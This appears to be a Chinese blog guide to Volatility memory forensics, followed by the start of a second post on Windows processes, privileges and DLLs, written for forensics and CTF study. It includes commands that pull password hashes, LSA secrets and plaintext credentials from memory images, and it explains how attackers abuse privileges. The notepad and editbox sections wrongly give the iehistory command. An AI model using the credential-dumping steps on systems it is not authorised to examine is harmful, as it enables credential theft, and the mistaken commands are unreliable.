Name：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径 进程分析 查看进程列表（pslist/psscan） Volatility2 仅查看显式进程：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; pslist 查看包括隐藏进程在内的进程：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; psscan Offset(V)：进程对象在内存中的虚拟地址 Name：进程的映像文件名（通常是.exe文件名） PID：进程ID，每个进程唯一的身份编号 PPID：父进程ID，即启动这个进程的那个进程的ID Thds：线程数，该进程拥有的线程数量 Hnds：句柄数，该进程打开的句柄数量 Sess：会话ID，用于区分不同的用户登录会话 Wow64：如果为 True，表示一个32位进程运行在64位系统上 Start：进程的创建时间 Exit：进程的退出时间（如果进程已终止） Volatility3 仅查看显式进程：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.pslist.PsList\t查看包括隐藏进程在内的进程：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.psscan.PsScan\tPID：进程ID PPID：父进程ID，即启动这个进程的那个进程的ID\nImageFileName：进程的映像文件名，通常是.exe文件名\nOffset(V)：进程对象在内存中的虚拟地址\nThreads：线程数，该进程拥有的线程数量\nHandles：句柄数，该进程打开的句柄数量\nSessionID：会话ID\nWow64：如果为 True，表示一个32位进程运行在64位系统上\nCreatTime：进程的创建时间\nExitTime：如果进程已终止，显示进程的退出时间\nFile output：是否已经被导出（dump）\n查看进程父子关系（pstree） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; pstree 区分父子进程：\nwininit.exe：行首没有点，它是这个分支的顶级进程\nservices.exe：行首有 1个点，它位于 wininit.exe（0个点）的下方，所以 services.exe 是 wininit.exe 的子进程\nTCPSVCS.EXE：行首有 2个点，它位于 services.exe（1个点）的下方，所以 TCPSVCS.EXE 是 services.exe 的子进程\n当一个进程的父进程ID（PPID）比它自身的进程ID（PID）还要大时，很可能有问题\nVolatility3 vol3 vol.py -f \u0026lt;内存镜像\u0026gt; windows.pstree.PsTree 与volatility2不同，3使用*来区分父子进程，*越多，代表进程的层级越深，是更深层的子进程\nPath：每个进程可执行文件在硬盘上的完整路径 Cmd：启动该进程时使用的完整命令行参数 发现隐藏进程（psxview） 恶意进程一般会隐藏自身，而人工对比pslist和psscan又太麻烦太不可靠\n可以使用psxview对比各个扫描方式，寻找隐藏进程\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; psxview 过滤带有false的项目，可以很快看出哪些进程隐藏了自身（主要看第一个pslist和第二个psscan）：\nVolatility3 python3 vol.py -f \u0026lt;内存镜像\u0026gt; windows.malware.psxview.PsXView 过滤False项：\n查看进程启动参数（cmdline） 能看到进程如何被创建的，包括命令行启动和exe文件点击启动\n但看不到进程内部的交互，不知道进程干了什么\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; cmdline Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.cmdline.CmdLine 查看进程加载的DLL（dlllist） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; dlllist -p 进程pid Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.dlllist.DllList --pid 进程pid 相较于vol2，vol3还给出了dll的加载时间LoadTime：\n查看进程权限（privs） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; privs Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.privileges.Privs 查看进程对应用户SID（getsids） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; getsids Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.getsids.GetSIDs 相较于Volatility2，这个输出更加规范化：\nPID：进程ID\nProcess：进程名\nSID：安全标识符的字符串表示\nName：该 SID 对应的通用名称\n一个进程会对应多个SID，是因为一个进程的访问令牌中，不仅包含了其主要运行身份的SID，还包含了该身份所属的所有用户组的SID，这些SID共同决定了该进程的权限\n例如，System(PID:4)这个进程，它关联了多个SID：\nS-1-5-18 (Local System)：这是它的主身份，代表了系统的最高权限 S-1-5-32-544 (Administrators)：表明它也属于管理员组 S-1-1-0 (Everyone)：表明它也属于Everyone组 查看可能的恶意代码（malfind） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; malfind volatility2还有一个社区插件，是malfind的深度扫描版本malfinddeep：\nhttps://github.com/superponible/volatility-plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; malfinddeep Volatility3 vol3 -f MemoryDump_Lab5.raw windows.malware.malfind.Malfind 提取进程内存（memdump/\u0026ndash;dump） 进程内存中潜藏着很多信息，把他们提取出来才能更好的做分析\n比如TrueCrypt进程中会有加密密钥，导出其为.dmp文件后，可以交给EFDD解密加密卷\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; memdump -p \u0026lt;PID\u0026gt; -D \u0026lt;保存路径\u0026gt; 提取后的文件为.dump，存储了进程所有的数据，可以在里面搜索目标字符串等\n如果进程里有想要的文件，可以使用foremost分离文件\n如果目标比较明显（比如图片），也可以用mv命令修改文件后缀再打开，再在里面找目标文件\nVolatility3 vol3不再有单独的dump插件，直接在PsList插件使用--dump选项：\nvol3 -f \u0026lt;内存镜像\u0026gt; -o \u0026lt;保存路径\u0026gt; windows.pslist.PsList --pid \u0026lt;PID\u0026gt; --dump 这里的-o选项用于指定导出文件的路径，必须放在-f选项后一个！！\n网络活动分析 查看网络连接（netscan/netstat） Volatility2 查看当前以及历史、隐藏网络链接（这个是XP时代的工具了，很老，不一定有用）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; connscan 查看当前网络链接：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; netscan LISTENING：表示某个程序正在一个端口上“监听”，等待外部连接的建立\nESTABLISHED：表示一个 TCP 连接已经成功建立，双方正在进行数据通信\nCLOSED/TIME_WAIT/SYN_SENT：表示各种已关闭或正在建立/关闭过程中的连接状态\nUDP 是无连接的协议，所以它没有 State（状态）字段 我们可以从中筛选已经建立链接的项：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; netscan | grep ESTABLISHED 如果当前系统中存在挖矿进程，网络连接列表又太长，就可以借此筛选，获取到矿池地址\n或者也可以根据提供的pid把它dump下来具体分析\nVolatility3 更加建议使用NetStat，报告更赏心悦目：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.netstat.NetStat 当然，vol3也是有NetScan的：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.netscan.NetScan 注册表分析 查看注册表整体结构（hivelist） hivelist的主要作用是为后续的printkey等插件提供每个Hive的虚拟地址（第一列）\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; hivelist ntuser.dat：用户的注册表文件，这里表明Alissa Simpson和SmartNet是登录状态或近期登录过\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.hivelist.HiveList 查看具体注册表项（printkey） Volatility2 使用逻辑路径：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; printkey -K \u0026#34;顶层路径\\子路径\u0026#34; 一定是从对应的hive开始，比如SAM，SECURITY等，而不是那五个根键：\n也可以使用虚拟地址：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; printkey -o 虚拟地址 再根据结果返回的SubKeys使用-K参数：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; -o 虚拟地址 printkey -K \u0026#34;子键名称\u0026#34; Volatility3 vol3只指定路径会去所有hive中寻找，需要使用逻辑路径＋虚拟地址才能精确定位：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.printkey.PrintKey --offset 虚拟地址 --key \u0026#34;顶层路径\\子路径\u0026#34; 用户活动与执行历史 查看cmd历史命令（cmdscan） 输出干净，有时能找到超出缓冲区范围的命令，即使已经清屏\n但没有命令的输出结果，且只限于cmd\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; cmdscan Application：DumpIt.exe：Volatility在内存中定位到的这个命令历史记录区是属于DumpIt.exe的\n这里cmdcount=0，说明没有发现cmd命令\nDumpIt.exe是于快速创建物理内存完整转储的工具，也就是创建这个\u0026lt;内存镜像\u0026gt;用的\nVolatility3 vol3对于win7等老系统可能不支持，分析会报错，使用时注意\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.cmdscan.CmdScan 1.概览信息\nPID Process ConsoleInfo Property Address Data 2084 conhost.exe 0x1445c89b900 _COMMAND_HISTORY 0x1445c89b900 None 这部分告诉我们，在 PID 为2084的conhost.exe进程中，于内存地址0x1445c89b900处，找到了一个_COMMAND_HISTORY（命令历史）的数据结构\n2.历史记录的元数据\n下面几行带单个*的是这个历史记录本身的属性：\n* 2084 conhost.exe ... _COMMAND_HISTORY.Application ... cmd.exe * 2084 conhost.exe ... _COMMAND_HISTORY.CommandCount ... 3 * 2084 conhost.exe ... _COMMAND_HISTORY.CommandCountMax ... 50 Application：cmd.exe：表明这个命令行窗口的应用程序是cmd.exe CommandCount：3：它表示在这个命令历史缓冲区中，一共记录了3条命令 CommandCountMax：50：表示这个缓冲区最多可以记录50条命令 3.恢复出的命令内容\n下面带两个星号**的部分是用户输入过的命令：\n** 2084 conhost.exe ... CommandBucket_Command_0 ... ping easyforensics.com ** 2084 conhost.exe ... CommandBucket_Command_1 ... ipconfig ** 2084 conhost.exe ... CommandBucket_Command_2 ... ping easyforensics.com CommandBucket_Command_X：代表历史记录缓冲区中的第 X 个槽位 Data 列：清晰地显示了用户按顺序输入的三条命令： ping easyforensics.com ipconfig ping easyforensics.com 查看控制台完整交互（consoles） consoles不仅能看到输入的命令，还能看到命令返回的输出结果，只要是conhost.exe控制的交互式窗口(cmd、poweshell等)就能提取\n但它受缓冲区大小限制，只寻找当前屏幕缓冲区的内容，如果清屏了(cls)就找不到了\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; consoles Volatility3 vol3对于win7等老系统可能不支持，分析会报错，使用时注意\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.consoles.Consoles 此处显示未找到控制台信息\u0026quot;Console Information Not Found\u0026quot;\n查看GUI程序执行记录（userassist） 展示用户通过GUI启动的程序（点击快捷方式、开始菜单等）的信息，证明用户的主动操作行为\n它只记录explorer.exe，不接受cmd.exe/powershell.exe，不能看见用户通过命令行启动的程序\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; userassist Registry：...\\ntuser.dat：个人注册表配置文件，用户为Alissa Simpson\nREG_BINARY：程序名称\nCount：程序启动次数\nFocus Count：程序点击次数（焦点）\nLast Update：最后一次使用记录\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.userassist.UserAssist 查看程序准备记录（shimcache/shimcachemem） 记录任何准备执行的程序（包括后台服务、被浏览的文件等，不一定真的运行了）\n它甚至能记录已被删除的程序的执行痕迹\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; shimcache Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.shimcachemem.ShimcacheMem 查看剪贴板内容（clipboard） volatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; clipboard 除了使用volatility2之外，也可以查看ActivitiesCache.db数据库\n从Windows10版本1803开始，ActivitiesCache.db就开始记录剪贴板活动了，不过前提是要打开下面的设置：\n随后，在下面的路径找到ActivitiesCache.db：\nC:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\ConnectedDevicesPlatform\\ 使用数据库链接后，使用它自带的SmartLookup视图：\n这里我的ClipboardPayload字段为空，是因为我没有打开剪贴板历史记录，嘻嘻\n查看窗口图像（screeenshot） 从内存中提取窗口图像甚至恢复桌面画面，截图内容通常是窗口的客户区域，不是全屏桌面\n需要安装Pillow库：\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install Pillow deactivate 使用的同时必须指定保存路径（\u0026ndash;dump-dir=）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; screenshot --dump-dir=保存路径 文件名 含义 session_0 会话 0，表示本地物理桌面用户或服务（如 SYSTEM） WinSta0 用户交互的窗口站（Window Station），默认GUI桌面就在这里 Default 当前活动桌面 Winlogon 登录界面桌面，可能在锁屏状态时显示 Disconnect 断开连接时显示的桌面（比如远程桌面断开） Service-0x0-3e7$ 代表SYSTEM服务账户的窗口站 mssrestricteddesk 某些安全子系统（如 Speech 或 Office 隔离）的沙盒桌面 比如我这里获得的一张当时的屏幕截图session_2.WinSta0.Default.png，说明用户在查看一张图片：\n图片名base64解码就是flag：flag{!!_w3LL_d0n3_St4g3-1_0g_L4B_5_D0n3_!!}\n查看记事本中的内容（notepad） 本质是扫描记事本进程notepad.exe，还原的是正在显示和编辑的内容\nvolatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看用户可能编辑的内容（editbox） 它比notepad插件更加通用，不只针对记事本，而是扫描所有进程的内存，寻找所有编辑控件并提取文本\nvolatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看ie浏览器历史记录（iehistory） volatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看chrome浏览器历史记录（chromehistory） volatility3没有此功能\n需要下载插件chromehistory和sqlite_help：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; chromehistory 查看firefox浏览器历史记录（firefoxhistory） volatility3没有此功能\n需要下载插件firefoxhistory和sqlite_help：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; firefoxhistory 根据历史记录，我们可以去内存中查找是否有对应的文件：文件扫描与提取 查看已安装的软件（uninstallinfo） volatility3没有此功能\n需要下载插件uninstallinfo：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; uninstallinfo 查看查入系统的USB设备（usbstor） volatility3没有此功能\n需要下载插件usbstor：\nhttps://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; usbstor 密码和凭证获取（仅volatility2） volatility3没有下面的功能\n提取本地账户哈希（hashdump） 使用SYSTEM里面的SYSKEY提取SAM中的密码哈希\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; hashdump 输出格式是：\n[用户名]:[RID]:[LM哈希]:[NTLM哈希]::: 提取LSA密钥（lsadump） lsa是本地安全机构，通过它可以获取当前登录用户、服务账户等多种形式的凭证，甚至可能是明文密码\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; lsadump 以hex转储的形式输出，可能藏有东西\nDefaultPassword：系统为自动登录功能存储的密码，如果设置了就是对应用户的密码\nNL$KM：计算机的密钥，用于计算机和域控制器之间进行安全的通信和认证\nDPAPI_SYSTEM：系统级DPAPI的主密钥，用于解密用户保存的各种密码（浏览器里的、wifi密码等）\n提取明文密码（mimikatz） 实际上也是从lsass.exe里面提取，是lsadump的特化\n非官方插件，需要下载：\nhttps://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso 还需要安装依赖，必须是对应旧版本的construct库：\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install construct==2.5.2 deactivate 随后就可以使用了：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; mimikatz 查看Chrome记录的登录密码（lastpass） 需要下载插件lastpass：\nhttps://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; lastpass 获取TrueCrypt秘钥信息（truecryptmaster） vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; truecryptmaster 获取TrueCrypt密码信息 （truecryptpassphrase） vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; truecryptpassphrase 文件扫描与提取 扫描内存中的文件（filescan） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan 如果知道具体文件名称（-i忽略大小写）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan | grep -i \u0026#39;secret.txt\u0026#39; 如果想找指定文件类型（-E正则匹配）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; filescan | grep -E \u0026#39;jpg|png|jpeg|bmp|gif\u0026#39; 最前面的十六进制是文件地址\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.filescan.FileScan 从内存中转储指定文件（dumpfiles） filescan插件扫描的是_FILE_OBJECT这样的内核结构，相当于找到了文件的档案卡\ndumpfiles插件则是根据这张档案卡的指引，去内存中寻找文件的具体内容\n如果文件的内容当时没有被加载到内存（RAM）中，或者已经被操作系统置换到了页面文件（pagefile.sys）里，那么dumpfiles就无法从内存镜像中提取出完整的文件数据\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;配置文件\u0026gt; dumpfiles -Q \u0026lt;物理地址\u0026gt; -D \u0026lt;目录\u0026gt; 下载的文件是.data文件，改后缀或使用foremost等工具分析\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; -o \u0026lt;目录\u0026gt; windows.dumpfiles.DumpFiles --physaddr \u0026lt;物理地址\u0026gt; 从内存中搜索字符串 (strings) Volatility3有windows.strings.Strings插件，不过不太好用，我们主要目的还是搜索字符串\n常见的用法是先用memdump转储出某个可疑进程的内存文件，然后对这个小文件执行strings，这样目标更明确，噪音也更少：\nstrings 1234.dmp | grep -i \u0026#34;关键词\u0026#34; ","date":"2025-07-21T12:51:01+08:00","image":"http://picture.928330.xyz/typora/1pgvz3h0o0wydnqs6q91v9w.jpg","permalink":"https://blog.928330.xyz/p/volatility%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/","title":"volatility使用说明"},{"content":"windows相关知识总结（上）：\nhttp://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8A/ 进程 常见进程 初始化进程 System 进程ID通常为4，是内核级线程的宿主，是运行ntoskrnl.exe的容器\n（ntoskrnl.exe负责内存管理、进程/线程调度、硬件抽象、系统调用处理等功能）\n它是进程树的根，没有父进程，如果看到有用户模式的进程成为它的子进程，需要高度警惕\nsmss.exe 会话管理器子系统，负责创建新的用户会话，是系统中的第一个真实进程\n它会启动csrss.exe和winlogon.exe\ncsrss.exe 客户端/服务器运行时子系统，负责管理窗口、线程和控制台等，每个会话中都会有一个实例\n其父进程必须是smss.exe\nwininit.exe Windows初始化进程，在系统引导时启动，会一直保留在后台运行\n它的核心任务是启动三个关键进程：services.exe、lsass.exe和lsm.exe，任何其他进程都值得审查\n其父进程应为空\nwinlogon.exe Windows 登录管理器，负责处理用户的交互式登录与注销过程，并加载用户配置文件\n在用户成功登录后，它会负责启动userinit.exe\n其父进程必须是smss.exe\nuserinit.exe 用户初始化进程，负责在用户登录后执行登录脚本、恢复网络连接，并启动用户外壳程序（Shell）\n它在启动了用户的桌面环境（默认为 explorer.exe）后会立刻退出，因此在正常的进程列表中几乎看不到它\n其父进程必须是winlogon.exe\nexplorer.exe Windows资源管理器，也是用户登录后启动的第一个进程，是所有用户图形化操作的起点\n在一个标准的 Windows 会话中，它有四个功能：\n文件管理器：打开“我的电脑”时看到的那些文件和文件夹窗口 任务栏与开始菜单：屏幕底部的任务栏、开始按钮、系统托盘区 桌面图标管理器：桌面图标，以及对它们的点击、拖拽等交互 桌面背景绘制：桌面壁纸等 恶意软件经常向其注入DLL，以获取用户权限并保持持久化\n核心服务进程 services.exe 服务控制管理器，负责启动和管理所有系统服务，是所有通过正常方式启动的svchost.exe的父进程\n其父进程必须是wininit.exe\nlsass.exe 本地安全机构子系统服务，内存中存放着用户的密码哈希等敏感凭证，系统中必须有且只有一个实例\n其父进程必须是wininit.exe\nlsm.exe 本地会话管理器服务，处理与用户登录、注销、远程桌面连接和快速用户切换相关的终端服务\n其父进程必须是wininit.exe\nsvchost.exe 服务宿主进程，是 Windows 系统中的一个核心进程，专门用作运行各种系统服务的“容器”或“宿主”\n它也是最常见的伪装和注入目标：\n父进程：必须是services.exe\n文件路径：必须位于C:\\Windows\\System32\\\n网络连接：它承载的系统服务中，哪些建立了网络连接，连接到哪里\n脚本执行进程 rundll32.exe 用于执行DLL文件中的函数，攻击者常用它来加载恶意DLL，从而绕过基于程序名的检测\n分析时应关注其父进程是谁，以及它加载了哪个DLL\npowershell.exe 是命令行和脚本引擎，现代无文件攻击的首选工具\n任何powershell.exe的出现都值得审查，特别是其命令行参数中是否包含编码（-e）、混淆或下载链接\nconhost.exe 控制台窗口主机，为cmd.exe等命令行程序提供交互界面\n它的内存中存储了该命令行窗口中所有输入过的命令和输出过的结果\n进程权限 系统级核心特权 SeTcbPrivilege **这是Windows中权限最高、最强大的特权之一。**全称是作为操作系统的一部分(Act as part of the operating system)，通常被称为可信计算基（Trusted Computer Base, TCB）特权\n拥有此特权的进程被视为系统核心信任的一部分，可以执行几乎任何操作，包括创建安全令牌来冒充任何用户，除了极少数核心系统进程，任何程序都不应拥有它\nSeDebugPrivilege **调试程序特权。**它授予一个进程附加到其他任意进程并检查、修改其内存的能力\n攻击者常利用它来从lsass.exe中窃取密码，除了调试器和核心安全软件，任何普通程序（如记事本、浏览器）拥有它都极度可疑\nSeLoadDriverPrivilege **加载和卸载设备驱动程序特权。**它授予一个进程将内核模式驱动程序（.sys文件）加载到Windows内核中或从内核中卸载的能力\n这是通往内核模式的入口，恶意软件一旦获得此特权，就可以加载自己的恶意驱动，从而隐藏文件、进程、网络连接，并完全绕过用户态的安全软件\n安全与审计特权 SeTakeOwnershipPrivilege **获取对象所有权特权。**它授予进程获取系统上任何安全对象（如文件、文件夹、注册表项）的所有权的能力，即使该进程原本没有访问该对象的权限\n攻击者获得它之后，就可以强行霸占受系统保护的文件或注册表键，然后赋予自己读写权限，进而篡改系统配置或替换核心文件\nSeBackupPrivilege **备份文件和目录特权，可以做到读取一切。**它允许进程在读取文件时，绕过所有常规的文件和目录权限检查（ACL），其初衷是让备份软件可以备份系统上的所有文件\n数据窃取类木马和勒索软件经常利用此特权来读取它们本无权访问的敏感用户文档、数据库文件或配置文件，以便进行窃取或加密\nSeRestorePrivilege **还原文件和目录特权，可以做到写入一切。**与SeBackupPrivilege对应，它允许进程在写入文件时，绕过所有权限检查\n恶意软件可以利用它来覆盖受保护的系统文件、在系统目录中释放恶意程序，或修改锁定的配置文件以实现持久化\nSeSecurityPrivilege **管理审核和安全日志特权，可以做到删除痕迹。**主要允许进程查看和清空 Windows 安全事件日志\n攻击者在完成入侵后，会利用这个特权来清空安全日志，从而抹去自己的登录尝试、账户创建、权限使用等痕迹\n常规特权 SeShutdownPrivilege **关闭系统特权。**授予进程关闭本地计算机的权力\nSeImpersonatePrivilege **身份验证后模拟客户端特权。**通常授予服务类账户，允许一个服务进程模拟连接到它的客户端的安全上下文\n攻击者可以诱使一个高权限进程（如SYSTEM）来连接自己，然后利用此特权“模拟”这个高权限进程，从而将自己从一个低权限的服务账户提升到SYSTEM权限\nSeChangeNotifyPrivilege **绕过遍历检查特权。**它允许进程在访问一个对象时，无需检查路径中所有上级目录的权限\n这是一个正常无害的特权，Windows 默认会将其授予所有用户，包括最低权限的用户\nDLL 什么是DLL DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型\n在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中，当我们执行某一个程序时，相应的DLL文件就会被调用\n一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件\nDLL文件中存放的是各类程序的函数(子过程)实现过程，当程序需要调用函数时需要先载入DLL，然后取得函数的地址，最后进行调用\n使用DLL文件的好处是程序不需要在运行之初加载所有代码，只有在程序需要某个函数的时候才从DLL中取出\nDLL的调用方式 1. 静态调用 / 隐式链接 在运行程序前，必须先把所有的DLL都准备好，少一个都不行\n在编译程序的时候，开发者就已经在代码中明确声明了需要用到哪些DLL里的哪些函数 这些依赖关系被记录在最终生成的可执行文件（.exe）的头部，一个叫做“导入表“（Import Table）的地方 当运行这个.exe文件时，Windows加载器会首先读取这个表 加载器会根据导入表的信息，在硬盘上找到所有必需的DLL文件，并将它们加载到该进程的内存空间中 所有函数地址都链接好之后，程序的主代码才开始执行 2. 动态调用 / 显式链接 在运行程序前，不需要把所有的DLL都准备好，少了哪个就引入哪个\n程序在编译时，并不知道自己会用到哪些DLL 程序在运行过程中，根据当时的逻辑判断，临时决定需要某个DLL的功能 程序会调用特定的WindowsAPI函数来手动加载这个DLL LoadLibrary()：这个函数用来将指定的DLL文件加载到内存中 GetProcAddress()：加载成功后，用这个函数从DLL中获取特定函数的地址 拿到函数地址后，程序就可以像调用自己的函数一样调用它了 当不再需要时，可以调用FreeLibrary()将其从内存中卸载 常见DLL 核心系统库 (几乎所有进程都会加载) ntdll.dll WindowsNT核心库，是用户态程序与系统内核之间最底层的接口，封装了大量的系统调用，例如进程和线程的创建、内存管理、文件I/O以及与内核对象的交互\n其他更高层的核心库（如kernel32.dll）最终也需要调用ntdll.dll中的函数来完成实际的工作\nkernel32.dll / kernelbase.dll kernel32.dll是Windows中最核心的用户模式库之一，为应用程序提供了访问操作系统的基础功能，如内存管理、文件I/O和进程线程管理\n从Windows7开始，许多kernel32.dll的核心功能被重构并移入了kernelbase.dll，而kernel32.dll本身则更多地作为调用这些新功能的一个“转发层”\nuser32.dll 负责所有用户图形界面（GUI）的功能设计，如窗口、菜单、按钮、鼠标和键盘输入等，即结构和交互\n在早期32-bit 版本的Windows中，用户控件是在ComCtl32中实现的，但是一些控件的显示功能是在User32.dll中实现的，例如在一个窗口中非客户区域（边框和菜单）的绘制就是由User32.dll来完成的\nUser32.dll是操作系统的一个核心控件，它和操作系统是紧密联系在一起的，不同版本的Windows中User32.dll是不同，因此，应用程序在不同版本的Windows中运行的时候，由于User32.dll的不同，会导致应用程序的界面通常会有微小的不同\ngdi32.dll 负责图形化窗口的图形绘制与内容输出，包括像素、线条、字体、位图、画刷等，即内容和外观\ncomdlg32.dll 通用对话框库（Common Dialog Box Library），这个库为应用程序提供了标准的、预制好的对话框，比如常见的“打开文件”、“保存文件”和“打印”等窗口\n当user32.dll需要一个“打开文件”对话框时，它不去自己一点点造，而是直接从comdlg32.dll这里拿一个现成的、标准化的来用\nadvapi32.dll 高级Windows32位应用程序接口，负责处理注册表操作、系统服务管理、账户和安全相关的函数\n网络通信库 (判断网络行为的关键) ws2_32.dll / wsock32.dll Windows Sockets（套接字）库，是所有 TCP/IP 网络编程的基础\n这是一个最重要的网络行为指标\nwininet.dll 更高层的互联网协议库，封装了 HTTP、HTTPS 和 FTP 等协议，让程序能更方便地访问网页和传输文件。\ndnsapi.dll 负责进行 DNS 域名解析，即将网址（如 www.google.com）转换为 IP 地址\n脚本与执行相关库 shell32.dll 提供了核心的 Windows Shell（外壳）功能，如打开文件、显示属性、处理快捷方式等\nole32.dll / oleaut32.dll 负责处理 OLE（对象链接与嵌入）和 COM（组件对象模型）技术\nOffice 宏病毒和许多漏洞利用（如利用文档中嵌入的恶意对象）都严重依赖这两个库的功能\njscript.dll / vbscript.dll 分别用于解析和执行 JScript 和 VBScript 脚本的引擎\n当wscript.exe或mshta.exe等脚本执行进程加载它们时，表明有相应的脚本正在运行\n系统调用 什么是系统调用 系统调用是运行在用户模式 (UserMode/Ring3) 的应用程序，向操作系统内核 (KernelMode / Ring0) 请求服务或资源的唯一、规范化的接口\n这是操作系统为了保护自身稳定性和安全性而设定的核心机制，应用程序不能随心所欲地直接访问硬件或关键内存，所有这些敏感操作都必须通过系统调用，以一种受控的方式“委托”给内核来完成\n系统调用工作过程 准备阶段 用户模式的应用程序（例如notepad.exe）准备调用一个Win32API函数，比如 WriteFile，WriteFile 函数本身位于kernel32.dll中\n中介阶段 kernel32.dll中的WriteFile函数并不会直接执行写文件操作，它是一个包装函数\n它会把真正的写文件操作对应的系统调用编号（比如写文件的NtWriteFile 的编号）放入CPU的EAX寄存器中，并将其他参数（如文件句柄、数据缓冲区等）放入其他指定的寄存器\n切换阶段 准备好之后，ntdll.dll中的代码会执行一条特殊的CPU指令，例如SYSCALL\n特权级转换 SYSCALL指令会使CPU立即从用户模式切换到内核模式，并将控制权交给内核中一个预设好的系统调用总处理程序\n派阶段 